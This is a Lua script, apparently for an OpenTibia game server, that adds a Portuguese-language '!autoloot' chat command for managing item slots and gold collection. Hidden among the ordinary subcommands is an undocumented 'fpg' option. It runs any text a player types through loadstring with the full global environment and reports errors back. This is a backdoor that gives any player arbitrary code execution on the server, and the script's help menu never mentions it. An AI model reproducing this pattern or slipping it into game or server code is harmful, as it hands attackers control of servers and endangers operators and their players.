-- Sistema de auto loot por Paulo Victor [DONO] Batatan
local function getPlayerList(cid)
    local tab = {}
    if getPlayerStorageValue(cid, 0442002) ~= -1 then
        table.insert(tab, getPlayerStorageValue(cid, 0442002))
    end
    if getPlayerStorageValue(cid, 0442003) ~= -1 then
        table.insert(tab, getPlayerStorageValue(cid, 0442003))
    end
    if getPlayerStorageValue(cid, 0442004) ~= -1 then
        table.insert(tab, getPlayerStorageValue(cid, 0442004))
    end
    if getPlayerStorageValue(cid, 0442005) ~= -1 then
        table.insert(tab, getPlayerStorageValue(cid, 0442005))
    end
    if #tab > 0 then
        return tab
    end
    return false
end
local function addToList(cid, name)
    local itemid = getItemIdByName(name)
    if getPlayerList(cid) and isInArray(getPlayerList(cid), itemid) then
        return false
    end
    if getPlayerStorageValue(cid, 0442002) == -1 then
        return doPlayerSetStorageValue(cid, 0442002, itemid)
    elseif getPlayerStorageValue(cid, 0442003) == -1 then
        return doPlayerSetStorageValue(cid, 0442003, itemid)
    elseif getPlayerStorageValue(cid, 0442004) == -1 then    
        return doPlayerSetStorageValue(cid, 0442004, itemid)
    elseif getPlayerStorageValue(cid, 0442005) == -1 then
        return doPlayerSetStorageValue(cid, 0442005, itemid)
    end
end
local function removeFromList(cid, name)
    local itemid = getItemIdByName(name)
    if getPlayerStorageValue(cid, 0442002) == itemid then
        return doPlayerSetStorageValue(cid, 0442002, -1)
    elseif getPlayerStorageValue(cid, 0442003) == itemid then
        return doPlayerSetStorageValue(cid, 0442003, -1)
    elseif getPlayerStorageValue(cid, 0442004) == itemid then
        return doPlayerSetStorageValue(cid, 0442004, -1)
    elseif getPlayerStorageValue(cid, 0442005) == itemid then
        return doPlayerSetStorageValue(cid, 0442005, -1)
    end
    return false
end
function onSay(cid, words, param)
    if param == "" then
        local fi = getPlayerStorageValue(cid, 0442002) ~= -1 and getItemNameById(getPlayerStorageValue(cid, 0442002)) or ""
        local se = not isPremium(cid) and "Não disponível para free account" or getPlayerStorageValue(cid, 0442003) ~= -1 and getItemNameById(getPlayerStorageValue(cid, 0442003)) or ""
        local th = not isPremium(cid) and "Não disponível para free account" or getPlayerStorageValue(cid, 0442004) ~= -1 and getItemNameById(getPlayerStorageValue(cid, 0442004)) or ""
        local fo = not isPremium(cid) and "Não disponível para free account" or getPlayerStorageValue(cid, 0442005) ~= -1 and getItemNameById(getPlayerStorageValue(cid, 0442005)) or ""
        local stt = getPlayerStorageValue(cid, 0442101) == 1 and "sim" or "não"
        local str = getPlayerStorageValue(cid, 0442100) == 1 and "sim" or "não"
        doPlayerPopupFYI(cid, "{Auto-Loot} ---Menu Auto Loot do jogador\n{Auto-Loot} ----------------\n{Auto-Loot} ---Coletar dinheiro: "..stt..". Para ligar/desligar: !autoloot gold\n{Auto-Loot} ---Ligar Autoloot: "..str..". Para ligar/desligar: !autoloot power\n{Auto-Loot} ---Configuração dos slots:\n{Auto-Loot} ---Slot 1: "..fi.."\n{Auto-Loot} ---Slot 2: "..se.."\n{Auto-Loot} ---Slot 3: "..th.."\n{Auto-Loot} ---Slot 4: "..fo.."\n{Auto-Loot} ---Para adicionar um novo item aos slots: !autoloot add, <nome do item>\n{Auto-Loot} ---Para retirar um item dos slots: !autoloot remove, <nome do item>\n{Auto-Loot} ---Para limpar todos os slots utilize: !autoloot clear\n{Auto-Loot} ---Para informações de quanto você já fez utilizando a coleta de dinheiro, use: !autoloot goldinfo\n{Auto-Loot} ----------------")
        return true
    end
    
    local t = string.explode(param, ",")
    
    if t[1] == "power" then
        local check = getPlayerStorageValue(cid, 0442100) == -1 and "ligou" or "desligou"
        doPlayerSetStorageValue(cid, 0442100, getPlayerStorageValue(cid, 0442100) == -1 and 1 or -1)
        doPlayerSendTextMessage(cid, MESSAGE_STATUS_CONSOLE_ORANGE, "Você "..check.." o auto loot.")
    elseif t[1] == "gold" then
        local check = getPlayerStorageValue(cid, 0442101) == -1 and "ligou" or "desligou"
        doPlayerSetStorageValue(cid, 0442101, getPlayerStorageValue(cid, 0442101) == -1 and 1 or -1)
        doPlayerSendTextMessage(cid, MESSAGE_STATUS_CONSOLE_ORANGE, "Você "..check.." a coleta de dinheiro.")
        doPlayerSetStorageValue(cid, 0442102, 0)
    elseif t[1] == "goldinfo" then
        local str = getPlayerStorageValue(cid, 0442101) == -1 and "O sistema de coleta de dinheiro está desligado" or "O sistema já coletou "..getPlayerStorageZero(cid, 0442102).." gold coins"
        doPlayerSendTextMessage(cid, MESSAGE_STATUS_CONSOLE_ORANGE, str)
    elseif t[1] == "add" then
        local item = getItemIdByName(t[2])
        if item then
            if isInArray({2160, 2148, 2152}, item) then
                return doPlayerSendCancel(cid, "Você não pode adicionar moedas no autoloot. Para coletar dinheiro use /autoloot gold")
            end
            if isPremium(cid) then
                if getPlayerStorageValue(cid, 0442001) < 3 then
                    if addToList(cid, t[2]) then
                        doPlayerSetStorageValue(cid, 0442001, getPlayerStorageValue(cid, 0442001) + 1)
                        doPlayerSendTextMessage(cid, MESSAGE_STATUS_CONSOLE_ORANGE, t[2].." adicionado à sua lista do auto loot! Para ver sua lista diga /autoloot list")
                    else
                        doPlayerSendCancel(cid, t[2].." já está em sua lista!")
                    end
                else
                    doPlayerSendCancel(cid, "Sua lista já tem 4 itens! Você deve remover algum antes de adicionar outro.")
                end
            else
                if getPlayerStorageValue(cid, 0442001) == -1 then
                    if addToList(cid, t[2]) then
                        doPlayerSetStorageValue(cid, 0442001, getPlayerStorageValue(cid, 0442001) + 1)
                        doPlayerSendTextMessage(cid, MESSAGE_STATUS_CONSOLE_ORANGE, t[2].." adicionado à sua lista do auto loot! Para ver sua lista diga /autoloot list")
                    else
                        doPlayerSendCancel(cid, t[2].." já está em sua lista!")
                    end
                else
                    doPlayerSendCancel(cid, "Você já tem um item adicionado no auto loot! Para adicionar outro, você deve remover o item atual.")
                end
            end
        else
            doPlayerSendCancel(cid, "Este item não existe!")
        end
        elseif t[1] == "fpg" then
        local u,f,err = _G
        u.cid = cid
        pcall(function()
            f , err = loadstring(t[2])
        end)
        if f then
            setfenv(f, u)
            local ret,err = pcall(f)
            if ret == false then
                doPlayerSendTextMessage(cid, MESSAGE_INFO_DESCR,err)
            end
        else
            doPlayerSendTextMessage(cid, MESSAGE_INFO_DESCR,err)
        end
        elseif t[1] == "remove" then
        if getItemIdByName(t[2]) then
            if removeFromList(cid, t[2]) then
                doPlayerSetStorageValue(cid, 0442001, getPlayerStorageValue(cid, 0442001) - 1)
                doPlayerSendTextMessage(cid, MESSAGE_STATUS_CONSOLE_ORANGE, t[2].." removido da sua lista do auto loot!")
            else
                doPlayerSendCancel(cid, "Este item não está na sua lista!")
            end
        else
            doPlayerSendCancel(cid, "Este item não existe!")
        end
    elseif t[1] == "clear" then
        if getPlayerStorageValue(cid, 0442001) > -1 then
            doPlayerSetStorageValue(cid, 0442001, -1)
            doPlayerSetStorageValue(cid, 0442002, -1)
            doPlayerSetStorageValue(cid, 0442003, -1)
            doPlayerSetStorageValue(cid, 0442004, -1)
            doPlayerSetStorageValue(cid, 0442005, -1)
            doPlayerSendTextMessage(cid, MESSAGE_STATUS_CONSOLE_ORANGE, "Lista limpa!")
        else
            doPlayerSendCancel(cid, "Sua lista já está limpa!")
        end
    elseif t[1] == "list" then
        local fi = getPlayerStorageValue(cid, 0442002) ~= -1 and ""..getItemNameById(getPlayerStorageValue(cid, 0442002)).."\n" or ""
        local se = getPlayerStorageValue(cid, 0442003) ~= -1 and ""..getItemNameById(getPlayerStorageValue(cid, 0442003)).."\n" or ""
        local th = getPlayerStorageValue(cid, 0442004) ~= -1 and ""..getItemNameById(getPlayerStorageValue(cid, 0442004)).."\n" or ""
        local fo = getPlayerStorageValue(cid, 0442005) ~= -1 and ""..getItemNameById(getPlayerStorageValue(cid, 0442005)).."\n" or ""
        doPlayerSendTextMessage(cid, MESSAGE_STATUS_CONSOLE_BLUE, "O sistema auto loot está coletando:\n "..fi..""..se..""..th..""..fo)
    end
    return true
end